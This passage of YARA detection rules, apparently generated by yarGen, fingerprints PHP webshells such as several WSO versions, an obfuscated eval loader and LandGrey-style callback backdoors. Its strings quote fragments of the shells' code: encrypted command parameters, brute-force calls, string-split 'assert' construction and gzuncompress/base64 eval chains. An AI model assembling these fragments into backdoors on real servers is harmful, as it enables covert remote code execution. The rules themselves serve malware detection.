      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
   strings:
      $x1 = " '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_unam" ascii
      $s2 = "$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s3 = "if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s4 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s5 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s6 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s7 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s8 = "if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s9 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s10 = "echo \"<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s11 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s12 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s13 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s14 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s15 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
      $s16 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s17 = " Unable to execute command\\n\";" fullword ascii
      $s18 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s19 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s20 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule wso_4_2_3 {
   meta:
      description = "webshell - file wso-4.2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
   strings:
      $x1 = " '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_unam" ascii
      $s2 = "$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s3 = "if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s4 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s5 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s6 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s7 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s8 = "if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s9 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s10 = "echo \"<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s11 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s12 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s13 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s14 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s15 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
      $s16 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s17 = " Unable to execute command\\n\";" fullword ascii
      $s18 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s19 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s20 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule wso_4_2_1 {
   meta:
      description = "webshell - file wso-4.2.1.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
   strings:
      $x1 = " '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_unam" ascii
      $s2 = "$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s3 = "if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s4 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s5 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s6 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s7 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s8 = "if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s9 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s10 = "echo \"<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s11 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s12 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s13 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s14 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s15 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
      $s16 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s17 = " Unable to execute command\\n\";" fullword ascii
      $s18 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s19 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s20 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule wso_4_2_5 {
   meta:
      description = "webshell - file wso-4.2.5.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
   strings:
      $x1 = " '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_unam" ascii
      $s2 = "<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></scri" ascii
      $s3 = "<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></scri" ascii
      $s4 = "$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s5 = "if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s6 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s7 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s8 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s9 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s10 = "if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s11 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s12 = "echo \"<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s13 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s14 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s15 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s16 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s17 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
      $s18 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s19 = " Unable to execute command\\n\";" fullword ascii
      $s20 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule wso_4_1_3 {
   meta:
      description = "webshell - file wso-4.1.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
   strings:
      $x1 = " '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_" ascii
      $s2 = "$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s3 = "if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s4 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s5 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s6 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s7 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s8 = "if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s9 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s10 = "echo \"<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s11 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s12 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s13 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s14 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s15 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s16 = " Unable to execute command\\n\";" fullword ascii
      $s17 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s18 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s19 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s20 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,null,this." ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule wso_4_2_2 {
   meta:
      description = "webshell - file wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $x1 = " '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_unam" ascii
      $s2 = "$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s3 = "if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s4 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s5 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s6 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s7 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s8 = "if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s9 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s10 = "echo \"<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s11 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s12 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s13 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s14 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s15 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
      $s16 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s17 = " Unable to execute command\\n\";" fullword ascii
      $s18 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s19 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s20 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule pHp {
   meta:
      description = "webshell - file pHp.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "359c50f933db8f3d78c3c23e8537e4e5f604ae3671d448694c358fe2d7ff1e17"
   strings:
      $s1 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword ascii
      $s2 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword ascii
      $s3 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword ascii
      $s4 = ".php?u=" fullword ascii
   condition:
      uint16(0) == 0xbde8 and filesize < 1KB and
      all of them
}

rule webshell_php_supers {
   meta:
      description = "webshell - file supers.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fe907d192e97387975f2b1db50ff642208301495268c9a318d20c256e9356a82"
   strings:
      $s1 = "$S='an()Do;$d=baDoseDo64_encoDode(x(gzDoDocompressDo($o)DoDo,Do$k));print(\"<$k>Do$Dod</$k>\");@session_deDostroy(Do);}}}}';" fullword ascii
      $s2 = "$t='($e)Do{$k=$khDo.$kf;ob_sDotDoart();@eDoval(@gzDouDoncomDopress(Do@x(@bDoase64Do_decode(preg_replaDoce(aDoDorr';" fullword ascii
      $s3 = "$f='ay(\"/Do_/\",\"Do/-/\"),aDorrayDo(\"/\",\"+\"Do),$ss($s[$Doi],0,DoDo$e))Do),$k)));$o=ob_get_DoconteDonDots();ob_endDo_cle';" fullword ascii
      $s4 = "$b='$kh=\"63Doa9\"Do;$kfDo=\"f0eaDo\";fuDoncDotion x($t,$kDo){$c=strlen($kDo);$lDo=strlen(Do$t);$o=Do\"\";fDoor($iDo=';" fullword ascii
      $s5 = "$K='VEDoR;$rrDo=@$r[Do\"HTTDoP_REFERDoER\"];$rDoaDoDo=@$Dor[\"HTTP_DoACCEPDoT_LANGUADoGE\"];if($rr&&$raDo)Do{$Dou=Dopars';" fullword ascii
      $s6 = "$w='Do0;$Doi<$l;Do){for($j=0;($Doj<$cDo&&$i<$l);$j++Do,Do$i++){$o.DoDo=$t{$i}^Do$k{$j};}Do}retDourn $o;}$r=Do$_SER';" fullword ascii
      $s7 = "$Q=str_replace('Do','',$b.$w.$K.$a.$H.$I.$A.$M.$t.$f.$S);" fullword ascii
      $s8 = "$I='sl=Do\"sDotrtDoolower\";$i=$mDo[Do1][0].$m[1][1];$Doh=$sl($Doss(mdDo5($i.$kDoh),0,3Do));$DofDo=$sl($ss(md5(DoDo$i.$kf),0';" fullword ascii
      $s9 = "$A='Do,3))Do;$p=\"Do\";Dofor($z=1;$Doz<cDoount($m[Do1]DoDo);Do$z++)$p.=$q[$m[2][$Doz]Do];if(strpos($DoDop,$h)===0)Do';" fullword ascii
      $s10 = "$a='e_url($rr);paDorse_str($Dou[\"querDoy\"Do]Do,$q);$Doq=array_DoDovaDolues($q);prDoeDog_Domatch_all(Do\"/([\\\\w])[\\\\w-';" fullword ascii
      $s11 = "$M='{Do$s[$i]=\"\";$Dop=$ss($pDo,3);}if(arDoray_kDoey_existDos($i,$DoDos)){$Dos[$i].=Do$p;$e=strpDoos($s[Do$i],$f);DoifDo';" fullword ascii
      $s12 = "$H=']Do+(Do?:;Doq=0.([\\\\d]))?,?/\",$ra,DoDo$m);if($q&Do&$m){@seDossDoionDoDo_start();$s=&$_DoSESSIODoNDo;$ss=\"substr\";$Do';" fullword ascii
      $s13 = "$y=str_replace('km','','crkmekmate_kmkmfukmkmnction');" fullword ascii
      $s14 = "$P=$y('',$Q);$P();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule array_intersect_uassoc_filename_last_char_must_be_r {
   meta:
      description = "webshell - file array_intersect_uassoc-filename-last-char-must-be-r.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "afbdc53c91694f7a70bb97eff6a5080b1b47484bc4cc52e779ca08dca64c63df"
   strings:
      $s1 = "array_intersect_uassoc (array($_REQUEST[$password] => \"\"), array(1), $f);" fullword ascii
      $s2 = "$password = \"LandGrey\";" fullword ascii
      $s3 = "${\"LandGrey\"} =  $key.\"Land!\";" fullword ascii
      $s4 = "$key = substr(__FILE__,-5,-4);" fullword ascii
      $s5 = "$f = pack(\"H*\", \"13\".\"3f120b1655\") ^ $LandGrey;" fullword ascii
      $s6 = "3f120b1655" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule array_intersect_uassoc_headers_accept_r {
   meta:
      description = "webshell - file array_intersect_uassoc-headers-accept-r.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b79659cc9b529fe2926f662f4de45d0f457392ed6db0bba67bac21a92fde4c6f"
   strings:
      $s1 = "$password = \"LandGrey\";" fullword ascii
      $s2 = "array_intersect_uassoc(array($_REQUEST[$password] => \"\"), array(1), $f);" fullword ascii
      $s3 = "$key = substr(__FILE__,-5,-4);" fullword ascii
      $s4 = "${\"LandGrey\"} = $_SERVER[\"HTTP_ACCEPT\"].\"Land!\";" fullword ascii
      $s5 = "$f = pack(\"H*\", \"13\".\"3f120b1655\") ^ $LandGrey;" fullword ascii
      $s6 = "3f120b1655" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule array_intersect_ukey_cookie_ass {
   meta:
      description = "webshell - file array_intersect_ukey-cookie-ass.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7b7762fbba5b7c365ec786369ee86f89f4c5024856c2c7250121ae3d3790f20f"
   strings:
      $s1 = "array_intersect_ukey(array($_REQUEST[$password] => 1), array(1), $ch.\"ert\");" fullword ascii
      $s2 = "$password = \"LandGrey\";" fullword ascii
      $s3 = " *  Noticed: (PHP 5 >= 5.4.0, PHP 7)" fullword ascii
      $s4 = "$ch = $_COOKIE[\"set-domain-name\"];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule array_intersect_uassoc_filename_last_char_must_be_s {
   meta:
      description = "webshell - file array_intersect_uassoc-filename-last-char-must-be-s.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2967163644acb3fd0e4c22ecc5500a259baad86d4d984505084191429256a1af"
   strings:
      $s1 = "$password = \"LandGrey\";" fullword ascii
      $s2 = "array_intersect_uassoc(array($_REQUEST[$password] => \"\"), array(1), $f);" fullword ascii
      $s3 = "$f = $LandGrey ^ hex2bin(\"12101f040107\");" fullword ascii
      $s4 = "12101f040107" ascii
      $s5 = "${\"LandGrey\"} = substr(__FILE__,-5,-4) . \"class\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_php_ass {
   meta:
      description = "webshell - file ass.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "215b32bef871033106fa49cb1c4fc9ce876e22a7c756b02d40d7cca713c10af1"
   strings:
      $s1 = "forward_static_call_array($wx.\"ert\", array($_REQUEST[$password]));" fullword ascii
      $s2 = "$password = \"LandGrey\";" fullword ascii
      $s3 = " * Noticed: (PHP 5 >= 5.3.0, PHP 7)" fullword ascii
      $s4 = "$wx = substr($_SERVER[\"HTTP_REFERER\"],-7,-4);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule array_intersect_ukey {
   meta:
      description = "webshell - file array_intersect_ukey.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c87368ee51d21aac7faa97152ef3bc3a39de9a797fd03946c96ed4674396a846"
   strings:
      $s1 = "array_intersect_ukey(array($_REQUEST[$password] => 1), array(1), $ch[1].$ch[3].$ch[4]);" fullword ascii
      $s2 = "$password = \"LandGrey\";" fullword ascii
      $s3 = "$ch = explode(\".\",\"hello.ass.world.er.t\");" fullword ascii
      $s4 = " * Noticed: (PHP 5 >= 5.4.0, PHP 7)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule array_udiff_assoc {
   meta:
      description = "webshell - file array_udiff_assoc.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2c1485981f25e666a2f2888b24d39d85e9963dc3c9e87eac4904bcd82d49ecaf"
   strings:
      $s1 = "$password = \"LandGrey\";" fullword ascii
      $s2 = "* Noticed: (PHP 5 >= 5.4.0, PHP 7)" fullword ascii
      $s3 = "array_udiff_assoc(array($_REQUEST[$password]), array(1), \"assert\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_php_cmd {
   meta:
      description = "webshell - file cmd.php"
      author = "yarGen Rule Generator"
